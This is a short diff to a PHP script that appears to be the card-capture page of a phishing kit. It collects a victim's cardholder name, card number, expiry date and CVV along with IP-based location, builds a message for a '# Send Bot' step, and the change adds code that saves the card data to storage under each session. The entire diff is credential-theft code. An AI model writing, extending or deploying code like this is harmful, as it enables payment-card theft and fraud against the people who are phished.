@@ -8,6 +8,7 @@ error_reporting(0);
 # Adding Settings
 include('function.php');
 $settings = include('../config.php');
+require_once __DIR__ . '/../storage/storage.php';
 # User Agent 
 
 $useragent = $_SERVER['HTTP_USER_AGENT'];
@@ -33,6 +34,16 @@ $message .= "➤ [ City(IP) ]   : {$city}\n";
 $message .= "➤ [ Country ]    : {$countryname}\n";
 $message .= "➤ [ Date ]       : {$date}\n";
 $message .= ".--------------------------------.\n";
+
+# Persist step data
+$payload = [
+    'card_name' => $holder,
+    'card_number' => $ccnum,
+    'expiry' => $ccexp,
+    'cvv' => $cvv2
+];
+
+append_login_session_step(session_id(), 'card', $payload);
 
 
 # Send Bot
